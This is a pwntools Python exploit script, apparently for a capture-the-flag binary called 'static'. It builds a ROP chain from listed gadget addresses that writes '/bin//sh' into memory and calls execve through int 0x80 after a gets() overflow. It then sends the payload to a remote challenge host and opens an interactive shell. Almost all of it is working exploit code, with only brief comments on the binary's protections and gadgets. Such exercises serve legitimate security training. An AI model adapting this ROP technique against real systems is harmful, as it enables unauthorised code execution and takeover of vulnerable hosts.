from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
0x80488a5 :: be_exploited()

gets(ebp-0xc)
"""

'''
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x8048000  0x80d7000 r-xp    8f000 0      /tmp/static
0x80d8000  0x80dc000 rw-p     4000 8f000  /tmp/static
0x80dc000  0x80dd000 rw-p     1000 0      
0x81ed000  0x820f000 rw-p    22000 0      [heap]
0xf7f33000 0xf7f36000 r--p     3000 0     [vvar]
0xf7f36000 0xf7f37000 r-xp     1000 0     [vdso]
0xffdbc000 0xffddd000 rw-p    21000 0     [stack]
'''

"""
0x08055632: mov dword ptr [eax + 4], edx; ret; 
0x0809ceb4: mov dword ptr [eax], edx; ret; 

~~~~0x080a8cb6: pop eax; ret;~~~ Doesn't work because gets() blocks the newline character

0x08064564: mov eax, edx; ret; 

0x0806ebb2: pop ecx; pop ebx; ret; 
0x0806eb8b: pop edx; ret; 
0x080496d8: pop esi; ret; 

0x08049533: int 0x80;
"""

# p = process("./static")
p = remote("plsdonthaq.me", 6002)

# Optionally `push eax; pop ebx`
# 0x0806ee5b: push eax; adc al, 0x7c; and dword ptr [esi + 0x1a], edi; pop ebx; ret;
# But this is ugly

writableAddress = 0x80d8000 # Some writeable region that stays in the same location

payload = b''
payload += b'\x90' * 0x10

# eax = edx = writableAddress
payload += p32(0x0806eb8b)      # pop edx; ret;
payload += p32(writableAddress)
payload += p32(0x08064564)      # mov eax, edx; ret;

# *eax = edx = "/bin"
payload += p32(0x0806eb8b)      # pop edx; ret; 
payload += b'/bin'
payload += p32(0x0809ceb4)      # mov dword ptr [eax], edx; ret;

# *(eax+4) = edx = "//sh"
payload += p32(0x0806eb8b)      # pop edx; ret; 
payload += b'//sh'
payload += p32(0x08055632)      # mov dword ptr [eax + 4], edx; ret; 

# eax = 0xb
payload += p32(0x0806eb8b)      # pop edx; ret;
payload += p32(0xb)
payload += p32(0x08064564)      # mov eax, edx; ret;

# ecx = 0
# ebx = writableAddress
payload += p32(0x0806ebb2)      # pop ecx; pop ebx; ret; 
payload += p32(0)
payload += p32(writableAddress)

# edx = 0
payload += p32(0x0806eb8b)      # pop edx; ret; 
payload += p32(0)

# esi = 0
payload += p32(0x080496d8)      # pop esi; ret;
payload += p32(0)

payload += p32(0x08049533)      # int 0x80;

p.sendline(payload)
p.interactive()